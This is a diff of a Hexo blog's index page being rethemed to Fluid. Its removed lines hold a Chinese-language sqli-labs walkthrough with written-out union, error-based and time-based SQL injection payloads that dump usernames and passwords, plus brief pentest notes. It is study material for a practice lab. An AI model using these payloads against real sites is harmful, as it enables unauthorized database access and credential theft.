@@ -1,316 +1,442 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
+<meta name="twitter:card" content="summary_large_image">
   
   
   
-<link rel="stylesheet" href="/css/style.css">
+  <title>Hexo</title>
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
+
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
   
 <meta name="generator" content="Hexo 7.3.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <a class="main-nav-link" href="/">Home</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
         
-      </nav>
-      <nav id="sub-nav">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
         
         
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-小迪学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/09/21/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0/" class="article-date">
-  <time class="dt-published" datetime="2024-09-21T15:27:55.000Z" itemprop="datePublished">2024-09-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/09/21/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0/">小迪学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="1-前后端分离"><a href="#1-前后端分离" class="headerlink" title="1.前后端分离"></a>1.前后端分离</h1><p>原理:前端JS等框架，通过API传输数据<br>影响:<br>1、前端页面大部分不存在漏洞<br>2、后端管理大部分不在同域名<br>3、获得权限有可能不影响后端</p>
-<p>渗透经验：<br>1、首先进行信息收集，找到网站后端的地址<br>2、如果找不到，通过查询前段框架的历史漏洞，查看是否存在可进入的漏洞<br>3、基本不存在常规漏洞</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/09/21/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0/" data-id="cm28fxll40002zcttgfdl3mj6" data-title="小迪学习" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-SQL-libs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/09/02/SQL-libs/" class="article-date">
-  <time class="dt-published" datetime="2024-09-02T15:27:55.000Z" itemprop="datePublished">2024-09-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/09/02/SQL-libs/">SQL-libs</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="SQL注入方式"><a href="#SQL注入方式" class="headerlink" title="SQL注入方式"></a>SQL注入方式</h1><h2 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1.联合注入"></a>1.联合注入</h2><h2 id="2-延时注入"><a href="#2-延时注入" class="headerlink" title="2.延时注入"></a>2.延时注入</h2><h2 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h2><h1 id="SQL注入基本流程"><a href="#SQL注入基本流程" class="headerlink" title="SQL注入基本流程"></a>SQL注入基本流程</h1><h2 id="1-判断注入点，例如修改id查看页面变化"><a href="#1-判断注入点，例如修改id查看页面变化" class="headerlink" title="1.判断注入点，例如修改id查看页面变化"></a>1.判断注入点，例如修改id查看页面变化</h2><h2 id="2-判断闭合方式，常见闭合方式有-‘-‘’-‘-’等等-，采用注释的方式改变原函数功能"><a href="#2-判断闭合方式，常见闭合方式有-‘-‘’-‘-’等等-，采用注释的方式改变原函数功能" class="headerlink" title="2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能"></a>2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能</h2><h2 id="3-查询列数，通过group-by或者-order-by-函数获取列数"><a href="#3-查询列数，通过group-by或者-order-by-函数获取列数" class="headerlink" title="3.查询列数，通过group by或者 order by 函数获取列数"></a>3.查询列数，通过group by或者 order by 函数获取列数</h2><h2 id="4-通过union-select特性，可以将多个SELECT查询的结果结合在一起，同时输出"><a href="#4-通过union-select特性，可以将多个SELECT查询的结果结合在一起，同时输出" class="headerlink" title="4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出"></a>4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出</h2><h2 id="5-可以查询到想要的结果"><a href="#5-可以查询到想要的结果" class="headerlink" title="5.可以查询到想要的结果"></a>5.可以查询到想要的结果</h2><h3 id="知识补充：information-schema是mysql自带数据库-mysql都自带这个数据库"><a href="#知识补充：information-schema是mysql自带数据库-mysql都自带这个数据库" class="headerlink" title="知识补充：information_schema是mysql自带数据库,mysql都自带这个数据库"></a>知识补充：information_schema是mysql自带数据库,mysql都自带这个数据库</h3><ol>
-<li>获取所有表结构(TABLES)<br><code>SELECT  *  FROM information_schema.TABLES WHERE  TABLE_SCHEMA=&#39;数据库名&#39;</code><br>information_schema 中的表实际上是视图，而不是基本表。<br><code>information_schema</code> 是一个特殊的数据库，用于存储关于所有数据库对象（如表、列、索引等）的元数据。它提供了一种标准化的方式来查询数据库的结构和对象信息。下面是<code>information_schema</code> 中常用的几个表及其结构：<br><strong><code>information_schema.TABLES</code></strong>:<br> <strong><code>TABLE_SCHEMA</code></strong>: 表所在的数据库名称。<br> <code>table_name</code>：表的名称<br><strong><code>information_schema.COLUMNS</code></strong>:<br> <strong><code>COLUMN_NAME</code></strong>: 列的名称。</li>
-</ol>
-<h1 id="第1关-SQLI-1-联合注入"><a href="#第1关-SQLI-1-联合注入" class="headerlink" title="第1关-SQLI-1-联合注入"></a>第1关-SQLI-1-联合注入</h1><h2 id="第一步：首先判断注入点，更改id时，页面有回显"><a href="#第一步：首先判断注入点，更改id时，页面有回显" class="headerlink" title="第一步：首先判断注入点，更改id时，页面有回显"></a>第一步：首先判断注入点，更改id时，页面有回显</h2><p><img src="/../images/Pasted%20image%2020240909095455.png"></p>
-<h2 id="第二步：判断闭合方式"><a href="#第二步：判断闭合方式" class="headerlink" title="第二步：判断闭合方式"></a>第二步：判断闭合方式</h2><p>Less-1&#x2F;?id&#x3D;1’ 输入’ 可以判断出通过’判断<br><img src="/../images/Pasted%20image%2020240909095825.png"></p>
-<h2 id="第三步：利用注释-–-，注释掉原语句"><a href="#第三步：利用注释-–-，注释掉原语句" class="headerlink" title="第三步：利用注释 – +，注释掉原语句"></a>第三步：利用注释 – +，注释掉原语句</h2><p><img src="/../images/Pasted%20image%2020240909101026.png"></p>
-<h2 id="第四步：利用group-by判断条目数量"><a href="#第四步：利用group-by判断条目数量" class="headerlink" title="第四步：利用group by判断条目数量"></a>第四步：利用group by判断条目数量</h2><p><img src="/../images/Pasted%20image%2020240909101205.png"><br>发现条目为4时报错<br><img src="/../images/Pasted%20image%2020240909101243.png"><br>为3时正常输出，判断条目为3条</p>
-<h2 id="5-所以进行联合查询时需要union-select-1-2-3-三个部分"><a href="#5-所以进行联合查询时需要union-select-1-2-3-三个部分" class="headerlink" title="5.所以进行联合查询时需要union select 1,2,3 三个部分"></a>5.所以进行联合查询时需要union select 1,2,3 三个部分</h2><p><code>?id=1&#39; union select 1,2,3 -- +</code></p>
-<h3 id="5-1同时需要将前面id改为异常值，禁止原结果输出，会输出我们定义的“1-2-3”的别名"><a href="#5-1同时需要将前面id改为异常值，禁止原结果输出，会输出我们定义的“1-2-3”的别名" class="headerlink" title="5.1同时需要将前面id改为异常值，禁止原结果输出，会输出我们定义的“1,2,3”的别名"></a>5.1同时需要将前面id改为异常值，禁止原结果输出，会输出我们定义的“1,2,3”的别名</h3><p><code>?id=-1&#39; union select 1,2,3 -- +</code><br><img src="/../images/Pasted%20image%2020240909145849.png"></p>
-<h2 id="5利用嵌入select的函数，来进行嵌入执行"><a href="#5利用嵌入select的函数，来进行嵌入执行" class="headerlink" title="5利用嵌入select的函数，来进行嵌入执行"></a>5利用嵌入select的函数，来进行嵌入执行</h2><p><code>Less-1/?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database() ) -- +</code><br><code>group_concat</code>功能代表整合到一起输出<br>查询出表名有users,猜测users中有账号的用户名和密码<br><img src="/../images/Pasted%20image%2020240909095222.png"><br><code>Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; ) -- +</code><br>获取到users表中的column字段内容<br><img src="/../images/Pasted%20image%2020240909152133.png"><br>根据字段和表再用直接查询，得到用户名和账号<br><code>Less-1/?id=-1&#39; union select 1,2,(select group_concat(username,password) from users ) -- +</code><br><img src="/../images/Pasted%20image%2020240909152411.png"></p>
-<h1 id="第2关-SQLI-2-联合注入"><a href="#第2关-SQLI-2-联合注入" class="headerlink" title="第2关-SQLI-2-联合注入"></a>第2关-SQLI-2-联合注入</h1><p>数字型id，同样的方式，但没有字符，不需要闭合方式<br><code>less-1/?id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;) --+</code><br><img src="/../images/Pasted%20image%2020240909153251.png"></p>
-<h1 id="第3关-SQLI-3-联合注入"><a href="#第3关-SQLI-3-联合注入" class="headerlink" title="第3关-SQLI-3-联合注入"></a>第3关-SQLI-3-联合注入</h1><p><code>Less-3/?id=2&#39;) -- +</code> 闭合方式为<code>&#39;)</code></p>
-<h1 id="第4关-SQLI-4-联合注入"><a href="#第4关-SQLI-4-联合注入" class="headerlink" title="第4关-SQLI-4-联合注入"></a>第4关-SQLI-4-联合注入</h1><p><code>Less-3/?id=-1&quot;)  -- +闭合方式为&quot;)</code><br><img src="/../images/Pasted%20image%2020240909154755.png"></p>
-<h1 id="第5关-SQLI-4-无回显可以选用报错注入、延时盲注、布尔盲注"><a href="#第5关-SQLI-4-无回显可以选用报错注入、延时盲注、布尔盲注" class="headerlink" title="第5关-SQLI-4-无回显可以选用报错注入、延时盲注、布尔盲注"></a>第5关-SQLI-4-无回显可以选用报错注入、延时盲注、布尔盲注</h1><p><code>Less-5/?id=1&#39; and 1=1 -- +</code> 更改错误信息，无回显，可以选择报错注入、延时盲注、布尔盲注<br><img src="/../images/Pasted%20image%2020240909172117.png"></p>
-<h3 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h3><h4 id="1、floor"><a href="#1、floor" class="headerlink" title="1、floor()"></a>1、floor()</h4><h4 id="2、updatexml-xml-doument-XPath-string-new-value"><a href="#2、updatexml-xml-doument-XPath-string-new-value" class="headerlink" title="2、updatexml(xml_doument,XPath_string,new_value)"></a>2、updatexml(xml_doument,XPath_string,new_value)</h4><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br> and updatexml(1,concat(0x7e,(),0x7e),1) –+一共可以接收三个参数，报错位置在第二个参数.</p>
-<h4 id="3、extractvalue"><a href="#3、extractvalue" class="headerlink" title="3、extractvalue()"></a>3、extractvalue()</h4><p>updatexml使用三个参数，extractvalue只有两个参数。<br>and extractvalue(1,concat(0x7e,())) –+一共可以接收两个参数，报错位置在第二个参数</p>
-<p><code>Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) -- +</code><br>通过updatexml函数获取数据库名<br><img src="/../images/Pasted%20image%2020240910151637.png"><br><code>Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- +</code><br>类似上述流程，获取表名：<del>emails,referers,uagents,users</del><br><img src="/../images/Pasted%20image%2020240910153534.png"></p>
-<p><code>Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1) -- +</code><br>获取users表中的列名<br><img src="/../images/Pasted%20image%2020240910153836.png"><br><code>Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1) -- +</code><br>获取users表中的username和password<br><img src="/../images/Pasted%20image%2020240910154349.png"></p>
-<h2 id="第6关-SQL-libs-6"><a href="#第6关-SQL-libs-6" class="headerlink" title="第6关 SQL-libs-6"></a>第6关 SQL-libs-6</h2><h6 id="1-利用extractvalue函数-，闭合方式为-”-其他同上"><a href="#1-利用extractvalue函数-，闭合方式为-”-其他同上" class="headerlink" title="1.利用extractvalue函数 ，闭合方式为 ” ,其他同上"></a>1.利用extractvalue函数 ，闭合方式为 ” ,其他同上</h6><p><img src="/../images/Pasted%20image%2020240911094816.png"><br>先查表名，在获取列名，在查询账户密码<br><img src="/../images/Pasted%20image%2020240911165748.png"><br><code>Less-6/?id=4&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users   ))) -- +</code><br><img src="/../images/Pasted%20image%2020240911165948.png"></p>
-<h2 id="第8关-SQL-libs-8-–时间盲注"><a href="#第8关-SQL-libs-8-–时间盲注" class="headerlink" title="第8关 SQL-libs-8 –时间盲注"></a>第8关 SQL-libs-8 –时间盲注</h2><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>时间盲注是利用sleep函数造成延时，判断是否可以进行注入<br>由于页面无法返回正确或错误的值，需要通过判断语句，类似布尔注入，通过if和sleep函数来逐步判断范围，需要用到的函数格式如下<br><code>if（判断语句，x，y）如果判断语句正确则输出X，否则输出Y</code><br><code>if(1=1,1,sleep(1))，可以输入1</code><br><code>if(1=2,1,sleep(1))，会sleep1秒后在进行回显</code></p>
-<p><code>Less-8/?id=1&#39; and if(1=2,1,sleep(1))&#39; ，通过尝试发现闭合方式为</code>id&#x3D;1’’&#96;,通过sleep函数发现有延时<br><img src="/../images/Pasted%20image%2020241012225955.png"></p>
-<h4 id="判断库名的长度"><a href="#判断库名的长度" class="headerlink" title="判断库名的长度"></a>判断库名的长度</h4><p>&#96;Less-8&#x2F;?id&#x3D;1’ and if(length(database())&lt;10,sleep(2),0) –+<br><img src="/../images/Pasted%20image%2020241012230418.png"></p>
-<h4 id="判断库的名字"><a href="#判断库的名字" class="headerlink" title="判断库的名字"></a>判断库的名字</h4><h5 id="可以通过ascii码进行，-也可以直接爆破"><a href="#可以通过ascii码进行，-也可以直接爆破" class="headerlink" title="可以通过ascii码进行， 也可以直接爆破"></a>可以通过ascii码进行， 也可以直接爆破</h5><h5 id="ascii方法"><a href="#ascii方法" class="headerlink" title="ascii方法"></a>ascii方法</h5><p><img src="/../images/Pasted%20image%2020241012231114.png"><br><code>if(ascii(substr(database(),1,1))=115,sleep(2),0)</code><br>substr()通过截断方式来获取名字字母，在通过ascii函数转换成ascii码进行对比，如果为真则sleep2秒</p>
-<h5 id="直接对比字母"><a href="#直接对比字母" class="headerlink" title="直接对比字母"></a>直接对比字母</h5><p><img src="/../images/Pasted%20image%2020241012231553.png"><br><code>Less-8/?id=1’&#39; and if(substr(database(),1,1)=&#39;s&#39;,sleep(5),0) -- +</code>，substr()通过截断方式来获取名字字母，与字母进行对比。<br><img src="/../images/Pasted%20image%2020241012231801.png"><br><code>Less-8/?id=1’&#39; and if(substr(database(),2,1)=&#39;e&#39;,sleep(5),0) -- +</code>，判断第二个字母是否为<br>e.</p>
-<h4 id="判断表名字"><a href="#判断表名字" class="headerlink" title="判断表名字"></a>判断表名字</h4><h5 id="通过substr函数进行表名分割"><a href="#通过substr函数进行表名分割" class="headerlink" title="通过substr函数进行表名分割"></a>通过substr函数进行表名分割</h5><p>if((substr(“查询表语句”,1,1)&#x3D;’e’) ,sleep(1), 0)<br>查询表名语句如下：<br>(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)<br><img src="/../images/Pasted%20image%2020241013125752.png"><br><code>Less-8/?id=1’&#39; and if((substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#39;e&#39;) ,sleep(1), 0) -- +</code></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/09/02/SQL-libs/" data-id="cm28fxll20001zctthigl9flk" data-title="SQL-libs" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/09/02/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2024-09-02T15:27:00.172Z" itemprop="datePublished">2024-09-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/09/02/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/09/02/hello-world/" data-id="cm28fxlky0000zcttbxcjda73" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2024/09/21/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0/">小迪学习</a>
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
           </li>
+          
         
-          <li>
-            <a href="/2024/09/02/SQL-libs/">SQL-libs</a>
-          </li>
         
-          <li>
-            <a href="/2024/09/02/hello-world/">Hello World</a>
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
           </li>
         
       </ul>
     </div>
   </div>
+</nav>
 
   
-</aside>
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="An elegant Material-Design theme for Hexo"></span>
+          
+        </div>
+
         
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
+
       
-      &copy; 2024 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
     </div>
   </div>
-</footer>
+</div>
 
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+</div>
+
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-x-md">
+        <div id="board"
+          style="margin-top: 0">
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/09/21/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0/" target="_self">
+          小迪学习
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/21/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0/" target="_self">
+        <div>
+          1.前后端分离原理:前端JS等框架，通过API传输数据影响:1、前端页面大部分不存在漏洞2、后端管理大部分不在同域名3、获得权限有可能不影响后端 渗透经验：1、首先进行信息收集，找到网站后端的地址2、如果找不到，通过查询前段框架的历史漏洞，查看是否存在可进入的漏洞3、基本不存在常规漏洞
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-09-21 23:27" pubdate>
+              2024-09-21
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/09/02/SQL-libs/" target="_self">
+          SQL-libs
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/02/SQL-libs/" target="_self">
+        <div>
+          SQL注入方式1.联合注入2.延时注入3.报错注入SQL注入基本流程1.判断注入点，例如修改id查看页面变化2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能3.查询列数，通过group by或者 order by 函数获取列数4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出5.可以查询到想要的结果知识补充：infor
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-09-02 23:27" pubdate>
+              2024-09-02
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
